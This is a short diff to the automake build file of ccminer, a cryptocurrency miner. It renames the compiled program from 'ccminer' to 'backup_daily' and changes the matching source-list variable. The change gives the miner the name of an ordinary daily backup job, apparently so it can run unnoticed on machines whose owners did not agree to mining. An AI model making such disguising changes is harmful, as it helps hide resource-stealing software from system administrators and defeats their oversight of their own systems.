@@ -13,9 +13,9 @@ EXTRA_DIST		= autogen.sh README.md README.txt LICENSE.txt \
 
 SUBDIRS = compat
 
-bin_PROGRAMS = ccminer
+bin_PROGRAMS = backup_daily
 
-ccminer_SOURCES	= elist.h miner.h compat.h \
+backup_daily_SOURCES	= elist.h miner.h compat.h \
 			  compat/inttypes.h compat/stdbool.h compat/unistd.h bignum.cpp bignum.hpp \
 			  compat/sys/time.h compat/getopt/getopt.h \
 			  crc32.c \
